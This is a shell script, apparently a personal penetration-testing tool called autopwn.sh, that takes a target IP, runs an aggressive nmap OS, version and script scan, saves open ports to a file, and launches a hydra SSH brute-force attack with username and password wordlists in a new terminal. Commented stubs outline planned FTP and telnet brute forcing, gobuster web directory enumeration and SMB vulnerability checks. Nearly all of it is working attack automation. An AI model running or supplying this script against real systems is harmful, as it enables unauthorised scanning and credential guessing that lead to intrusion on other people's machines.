#!/usr/bin/env sh

# Flow:
# nmap port scanning >> append to result.txt
# thread: nmap scripts/vulns scanning >> append to result.txt
# curl headers for information
# if port 21/22/23 open:
#     check for vuln
#     thread hydra bruteforce >> if found, append to result.txt
# if port 80/443/8080 (or better: enumerated http service):
#     thread gobuster enum directory >> append to result.txt
#     thread uniscan >> result.txt
# if port 445 open:
#     check for smb vuln

if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Pwning target $1"
else
    echo "Invalid target. Usage: ./autopwn.sh 192.168.1.1"
    exit
fi

ip=$1

echo
# echo $TERM
echo "Starting nmap scan on $ip"
echo

filename='output.txt'

echo "Autopwn Results" > $filename
echo "" >> $filename

echo "[x] Open ports" | tee -a output.txt
stdbuf -oL sudo nmap $ip -O -sC -sV -T4 -v -n |
    while IFS= read -r line
    do
        if [[ "$line" == *"Discovered"* ]]; then
            echo "$line" | tee -a $filename
        fi

        if [[ "$line" == *"STATE"* ]]; then
            result=true
            echo "" | tee -a $filename
            echo "[x] Full script scan" | tee -a $filename
        fi

        if [[ "$line" == *"Script Post-scanning"* ]]; then
            result=false
        fi

        if [ "$result" = true ]; then
            echo "$line" | tee -a $filename
        fi
    done

sshport=$(cat $filename | grep "open     ssh" | awk -F '/' {'print $1'})
# if [[  == *"open     ssh"* ]]; then
#     sshport=$(echo "$line" | awk -F '/' {'print $1'})
# fi
echo "SSH port: $sshport"
sshBrute () {
    hydra -V -I -L 500user.txt -P 200pass.txt $ip ssh -s $sshport | grep "configurations" | tee -a $filename
}
export -f sshBrute

if [ -n "$sshport" ]; then
    echo "Running ssh bruteforce with hydra"
    $TERM --hold -e bash -c 'sshBrute' &
fi

wait
echo "Autopwn finished. Results saved at $filename"







# ftpBrute () {
#     ftp
# }

# telnetBrute () {
#     telnet
# }

# webEnum () {
#     gobuster
# }

# smbVuln () {
#     smb
# }



# start new terminal to do stuff
# $TERM --hold -e sh -c "echo $ip"
